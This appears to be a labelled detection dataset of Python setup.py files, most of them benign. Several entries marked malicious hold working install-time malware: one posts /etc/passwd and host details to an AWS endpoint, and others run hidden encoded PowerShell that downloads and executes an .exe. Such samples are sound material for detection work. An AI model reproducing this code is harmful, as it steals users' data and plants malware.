packages=find_packages(where=\"src\", exclude=(\n        'tests',\n        'scripts',\n    )),\n    package_dir={\"\": \"src\"},\n    zip_safe=True,\n    include_package_data=True,\n    setup_requires=[\n        # Setuptools 18.0 properly handles Cython extensions.\n        'setuptools>=18.0',\n        'cython',\n    ],\n    install_requires=requirements,\n    extras_require={\n        'extras': [\n            'spacy',\n            'nltk>=3.2.5',\n            'sacremoses',\n            'scipy',\n            'numba>=0.45',\n            'jieba',\n            'sentencepiece',\n            'boto3',\n            'tqdm',\n            'sacremoses',\n            'regex',\n            'packaging',\n        ],\n        'dev': [\n            'pytest',\n            'pytest-env',\n            'pylint',\n            'pylint_quotes',\n            'flake8',\n            'recommonmark',\n            'sphinx-gallery',\n            'sphinx_rtd_theme',\n            'mxtheme',\n            'sphinx-autodoc-typehints',\n            'nbsphinx',\n            'flaky',\n            'notedown',\n            'matplotlib',\n            'Image',\n        ],\n    },\n    ext_modules=[\n        Extension('gluonnlp.data.fast_bert_tokenizer', sources=['src/gluonnlp/data/fast_bert_tokenizer.pyx']),\n    ],\n)\n", "target": 0}
{"idx": "ceedee-5.7.0", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.7.0',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "liburlcraftgrand-1.28", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlcraftgrand',\n    packages = ['modlib'],\n    version = '6.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-cvmcmine-1.58", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cvmcmine',\n    packages = ['modlib'],\n    version = '8.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tppongedintel-5.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppongedintel',\n    packages = ['modlib'],\n    version = '5.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "falcon-3.1.0", "func": "try:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from ez_setup import use_setuptools\n\n    use_setuptools()\n    from setuptools import setup, find_packages\n\nsetup(\n    name='nuts',\n    version='0.1',\n    description='',\n    author='',\n    author_email='',\n    install_requires=['pecan'],\n    test_suite='nuts',\n    zip_safe=False,\n    include_package_data=True,\n    packages=find_packages(exclude=['ez_setup']),\n)\n", "target": 0}
{"idx": "django_openstack_auth-3.6.1", "func": "# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# THIS FILE IS MANAGED BY THE GLOBAL REQUIREMENTS REPO - DO NOT EDIT\nimport setuptools\n\n# In python < 2.7.4, a lazy loading of package `pbr` will break\n# setuptools if some other modules registered functions in `atexit`.\n# solution from: http://bugs.python.org/issue15881#msg170215\ntry:\n    import multiprocessing  # noqa\nexcept ImportError:\n    pass\n\nsetuptools.setup(\n    setup_requires=['pbr>=2.0.0'],\n    pbr=True)\n", "target": 0}
{"idx": "eth-rlp-0.3.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    'test': [\n        \"eth-hash[pycryptodome]\",\n        \"pytest>=6.2.5,<7\",\n        \"pytest-xdist\",\n        \"tox==3.14.6\",\n    ],\n    'lint': [\n        \"flake8==3.7.9\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.770\",\n        \"pydocstyle>=3.0.0,<4\",\n    ],\n    'doc': [\n        \"Sphinx>=1.6.5,<2\",\n        \"sphinx_rtd_theme>=0.1.9\",\n        \"towncrier>=19.2.0, <20\",\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +  # noqa: W504\n    extras_require['test'] +  # noqa: W504\n    extras_require['lint'] +  # noqa: W504\n    extras_require['doc']\n)\n\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name='eth-rlp',\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version='0.3.0',\n    description=\"\"\"eth-rlp: RLP definitions for common Ethereum objects in Python\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='The Ethereum Foundation',\n    author_email='snakecharmers@ethereum.org',\n    url='https://github.com/ethereum/eth-rlp',\n    include_package_data=True,\n    install_requires=[\n        \"eth-utils>=2.0.0,<3\",\n        \"hexbytes>=0.1.0,<1\",\n        \"rlp>=0.6.0,<4\",\n    ],\n    python_requires='>=3.7, <4',\n    extras_require=extras_require,\n    py_modules=['eth_rlp'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "feedparser-6.0.10", "func": "# Copyright 2010-2022 Kurt McKee <contactme@kurtmckee.org>\n# Copyright 2002-2008 Mark Pilgrim\n# All rights reserved.\n#\n# This file is a part of feedparser.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n# * Redistributions of source code must retain the above copyright notice,\n#   this list of conditions and the following disclaimer.\n# * Redistributions in binary form must reproduce the above copyright notice,\n#   this list of conditions and the following disclaimer in the documentation\n#   and/or other materials provided with the distribution.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 'AS IS'\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n\nimport os\nimport pathlib\nimport re\nimport setuptools\n\n\nroot = pathlib.Path(__file__).parent\n\nlong_description = (root / 'README.rst').read_text()\n\nname = 'feedparser'\nif os.getenv('NAME_SUFFIX'):\n    name = f\"{name}_{os.getenv('NAME_SUFFIX')}\"\n\ncontent = (root / 'feedparser/__init__.py').read_text()\nmatch = re.search(r\"\"\"__version__ = ['\"](?P<version>.+?)['\"]\"\"\", content)\nversion = match.group('version')\nif os.getenv('VERSION_SUFFIX'):\n    version = f\"{version}rc{os.getenv('VERSION_SUFFIX')}\"\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    license='BSD-2-Clause',\n    description='Universal feed parser, handles RSS 0.9x, RSS 1.0, RSS 2.0, CDF, Atom 0.3, and Atom 1.0 feeds',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Kurt McKee',\n    author_email='contactme@kurtmckee.org',\n    url='https://github.com/kurtmckee/feedparser',\n    download_url='https://pypi.python.org/pypi/feedparser',\n    platforms=['POSIX', 'Windows'],\n    packages=['feedparser', 'feedparser.datetimes', 'feedparser.namespaces', 'feedparser.parsers'],\n    install_requires=['sgmllib3k'],\n    python_requires='>=3.6', \n    keywords=['atom', 'cdf', 'feed', 'parser', 'rdf', 'rss'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Text Processing :: Markup :: XML',\n    ],\n)\n", "target": 0}
{"idx": "dohq-teamcity-1.0.8", "func": "# coding: utf-8\n\nfrom setuptools import setup  # noqa: H301\n\nfrom dohq_teamcity.version import __version__ as VERSION\n\nNAME = \"dohq-teamcity\"\nREQUIRES = [\"urllib3 >= 1.15\", \"six >= 1.10\", \"certifi\", \"python-dateutil\"]\n\nsetup(\n    name=NAME,\n    version=VERSION,\n    description=\"Python JetBrains TeamCity REST API library\",\n    license='MIT',\n    author='Alexey Burov',\n    author_email='allburov@gmail.com',\n    url=\"https://github.com/devopshq/teamcity\",\n    keywords=[\"JetBrains\", \"TeamCity REST API\", \"DevOpsHQ\"],\n    install_requires=REQUIRES,\n    packages=[\n        'dohq_teamcity',\n        'dohq_teamcity.api',\n        'dohq_teamcity.custom',\n        'dohq_teamcity.models',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3.4',\n    ],\n    include_package_data=True,\n    long_description=\"\"\"\n    dohq_teamcity is a Python package providing access to the JetBrains TeamCity server API.\n\n    You can see detailed user manual here: https://devopshq.github.io/teamcity\n    \"\"\"\n)\n", "target": 0}
{"idx": "tppywultraint-8.15", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppywultraint',\n    packages = ['modlib'],\n    version = '8.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gunicorn-20.1.0", "func": "# -*- coding: utf-8 -\n#\n# This file is part of gunicorn released under the MIT license.\n# See the NOTICE for more information.\n\nimport os\nimport sys\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.test import test as TestCommand\n\nfrom gunicorn import __version__\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Other Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: MIT License',\n    'Operating System :: MacOS :: MacOS X',\n    'Operating System :: POSIX',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3 :: Only',\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Programming Language :: Python :: Implementation :: PyPy',\n    'Topic :: Internet',\n    'Topic :: Utilities',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    'Topic :: Internet :: WWW/HTTP',\n    'Topic :: Internet :: WWW/HTTP :: WSGI',\n    'Topic :: Internet :: WWW/HTTP :: WSGI :: Server',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content']\n\n# read long description\nwith open(os.path.join(os.path.dirname(__file__), 'README.rst')) as f:\n    long_description = f.read()\n\n# read dev requirements\nfname = os.path.join(os.path.dirname(__file__), 'requirements_test.txt')\nwith open(fname) as f:\n    tests_require = [l.strip() for l in f.readlines()]\n\nclass PyTestCommand(TestCommand):\n    user_options = [\n        (\"cov\", None, \"measure coverage\")\n    ]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.cov = None\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = ['tests']\n        if self.cov:\n            self.test_args += ['--cov', 'gunicorn']\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n        errno = pytest.main(self.test_args)\n        sys.exit(errno)\n\n\ninstall_requires = [\n    # We depend on functioning pkg_resources.working_set.add_entry() and\n    # pkg_resources.load_entry_point(). These both work as of 3.0 which\n    # is the first version to support Python 3.4 which we require as a\n    # floor.\n    'setuptools>=3.0',\n]\n\nextras_require = {\n    'gevent':  ['gevent>=1.4.0'],\n    'eventlet': ['eventlet>=0.24.1'],\n    'tornado': ['tornado>=0.2'],\n    'gthread': [],\n    'setproctitle': ['setproctitle'],\n}\n\nsetup(\n    name='gunicorn',\n    version=__version__,\n\n    description='WSGI HTTP Server for UNIX',\n    long_description=long_description,\n    author='Benoit Chesneau',\n    author_email='benoitc@e-engura.com',\n    license='MIT',\n    url='https://gunicorn.org',\n    project_urls={\n        'Documentation': 'https://docs.gunicorn.org',\n        'Homepage': 'https://gunicorn.org',\n        'Issue tracker': 'https://github.com/benoitc/gunicorn/issues',\n        'Source code': 'https://github.com/benoitc/gunicorn',\n    },\n\n    python_requires='>=3.5',\n    install_requires=install_requires,\n    classifiers=CLASSIFIERS,\n    zip_safe=False,\n    packages=find_packages(exclude=['examples', 'tests']),\n    include_package_data=True,\n\n    tests_require=tests_require,\n    cmdclass={'test': PyTestCommand},\n\n    entry_points=\"\"\"\n    [console_scripts]\n    gunicorn=gunicorn.app.wsgiapp:run\n\n    [paste.server_runner]\n    main=gunicorn.app.pasterapp:serve\n    \"\"\",\n    extras_require=extras_require,\n)\n", "target": 0}
{"idx": "Flask-Cors-3.0.10", "func": "# -*- coding: utf-8 -*-\n\"\"\"\n    setup\n    ~~~~\n    Flask-CORS is a simple extension to Flask allowing you to support cross\n    origin resource sharing (CORS) using a simple decorator.\n\n    :copyright: (c) 2016 by Cory Dolphin.\n    :license: MIT, see LICENSE for more details.\n\"\"\"\n\nfrom setuptools import setup\nfrom os.path import join, dirname\n\nwith open(join(dirname(__file__), 'flask_cors/version.py'), 'r') as f:\n    exec(f.read())\n\nwith open (join(dirname(__file__), 'requirements.txt'), 'r') as f:\n    install_requires = f.read().split(\"\\n\")\n\nsetup(\n    name='Flask-Cors',\n    version=__version__,\n    url='https://github.com/corydolphin/flask-cors',\n    license='MIT',\n    author='Cory Dolphin',\n    author_email='corydolphin@gmail.com',\n    description=\"A Flask extension adding a decorator for CORS support\",\n    long_description=open('README.rst').read(),\n    packages=['flask_cors'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=install_requires,\n    tests_require=[\n        'nose',\n        'packaging'\n    ],\n    test_suite='nose.collector',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "flatbuffers-2.0", "func": "# Copyright 2016 Google Inc. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport fileinput\nimport os\nimport re\nimport sys\nfrom datetime import datetime\nfrom setuptools import setup\n\n\ndef _update_version_attr(new_version):\n    for line in fileinput.input('flatbuffers/_version.py', inplace=True):\n        if line.startswith('__version__'):\n            line = re.sub(r'\".*\"', '\"{}\"'.format(new_version), line)\n        sys.stdout.write(line)\n\n\ndef version():\n    version = os.getenv('VERSION', None)\n    if version:\n        # Most git tags are prefixed with 'v' (example: v1.2.3) this is\n        # never desirable for artifact repositories, so we strip the\n        # leading 'v' if it's present.\n        version = version[1:] if version.startswith('v') else version\n    else:\n        # Default version is an ISO8601 compiliant datetime. PyPI doesn't allow\n        # the colon ':' character in its versions, and time is required to allow\n        # for multiple publications to master in one day. This datetime string\n        # uses the \"basic\" ISO8601 format for both its date and time components\n        # to avoid issues with the colon character (ISO requires that date and\n        # time components of a date-time string must be uniformly basic or\n        # extended, which is why the date component does not have dashes.\n        #\n        # Publications using datetime versions should only be made from master\n        # to represent the HEAD moving forward.\n        version = datetime.utcnow().strftime('%Y%m%d%H%M%S')\n        print(\"VERSION environment variable not set, using datetime instead: {}\"\n              .format(version))\n\n    _update_version_attr(version)\n\n    return version\n\n\nsetup(\n    name='flatbuffers',\n    version=version(),\n    license='Apache 2.0',\n    author='FlatBuffers Contributors',\n    author_email='me@rwinslow.com',\n    url='https://google.github.io/flatbuffers/',\n    long_description=('Python runtime library for use with the '\n                      '`Flatbuffers <https://google.github.io/flatbuffers/>`_ '\n                      'serialization format.'),\n    packages=['flatbuffers'],\n    include_package_data=True,\n    requires=[],\n    description='The FlatBuffers serialization format for Python',\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    project_urls={\n        'Documentation': 'https://google.github.io/flatbuffers/',\n        'Source': 'https://github.com/google/flatbuffers',\n    },\n)", "target": 0}
{"idx": "filechunkio-1.8", "func": "#!/usr/bin/env python\nimport sys\nfrom distutils.core import setup\n\nfrom filechunkio import __version__\n\nPY3 = sys.version_info[0] == 3\n\n\n_unicode = str if PY3 else unicode\n\n\nsetup(\n    name=\"filechunkio\",\n    version=_unicode(__version__),\n    description=\"FileChunkIO represents a chunk of an OS-level file \"\n    \"containing bytes data\",\n    long_description=\"\",\n    author=\"Fabian Topfstedt\",\n    author_email=\"topfstedt@schneevonmorgen.com\",\n    url=\"http://bitbucket.org/fabian/filechunkio\",\n    license=\"MIT license\",\n    packages=[\"filechunkio\"],\n    classifiers=[\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ],\n)\n", "target": 0}
{"idx": "testingijijwdaijdwa-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='testingijijwdaijdwa', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "django-versatileimagefield-2.2", "func": "# -*- coding: utf-8 -*-\nfrom distutils.core import setup\nfrom setuptools import find_packages\n\nsetup(\n    name='django-versatileimagefield',\n    packages=find_packages(),\n    version='2.2',\n    author=u'Jonathan Ellenberger',\n    author_email='jonathan_ellenberger@wgbh.org',\n    url='http://github.com/respondcreate/django-versatileimagefield/',\n    license='MIT License, see LICENSE',\n    description=\"A drop-in replacement for django's ImageField that provides \"\n                \"a flexible, intuitive and easily-extensible interface for \"\n                \"creating new images from the one assigned to the field.\",\n    long_description=open('README.rst').read(),\n    zip_safe=False,\n    install_requires=['Pillow>=2.4.0', 'python-magic>=0.4.15,<1.0.0'],\n    include_package_data=True,\n    keywords=[\n        'django',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        